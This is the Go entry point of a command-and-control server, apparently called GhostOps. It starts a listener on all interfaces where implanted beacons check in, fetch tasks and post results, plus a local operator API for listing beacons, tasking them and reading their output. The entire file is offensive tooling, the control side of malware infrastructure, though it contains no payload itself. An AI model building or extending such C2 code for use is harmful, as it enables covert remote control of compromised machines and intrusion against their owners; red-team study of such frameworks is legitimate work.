package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"

	"github.com/4w4647/GhostOps/server/banner"
	"github.com/4w4647/GhostOps/server/handlers"
	"github.com/4w4647/GhostOps/server/store"
)

func main() {
	c2Host := flag.String("c2-host", "0.0.0.0", "C2 listener bind address")
	c2Port := flag.Int("c2-port", 8080, "C2 listener port")
	opHost := flag.String("op-host", "127.0.0.1", "Operator API bind address")
	opPort := flag.Int("op-port", 9090, "Operator API port")
	logFile := flag.String("log", "", "path to log file (appended, in addition to stdout)")
	flag.Parse()

	var logWriter io.Writer = os.Stdout
	if *logFile != "" {
		f, err := os.OpenFile(*logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
		if err != nil {
			log.Fatalf("[!] cannot open log file: %v", err)
		}
		defer f.Close()
		logWriter = io.MultiWriter(os.Stdout, f)
	}
	logger := log.New(logWriter, "", log.LstdFlags)

	c2Addr := fmt.Sprintf("%s:%d", *c2Host, *c2Port)
	opAddr := fmt.Sprintf("%s:%d", *opHost, *opPort)

	s := store.New()
	c2 := &handlers.C2{Store: s, Log: logger}
	op := &handlers.Operator{Store: s, Log: logger}

	c2Mux := http.NewServeMux()
	c2Mux.HandleFunc("/checkin", c2.Checkin)
	c2Mux.HandleFunc("/tasks/", c2.Tasks)
	c2Mux.HandleFunc("/result", c2.Result)

	opMux := http.NewServeMux()
	opMux.HandleFunc("/beacons", op.List)
	opMux.HandleFunc("/beacons/", op.Get)
	opMux.HandleFunc("/task", op.Task)
	opMux.HandleFunc("/results/", op.Results)

	banner.Print(c2Addr, opAddr)

	go func() {
		if err := http.ListenAndServe(c2Addr, c2Mux); err != nil {
			logger.Fatalf("[!] C2 listener failed: %v", err)
		}
	}()

	if err := http.ListenAndServe(opAddr, opMux); err != nil {
		logger.Fatalf("[!] Operator API failed: %v", err)
	}
}
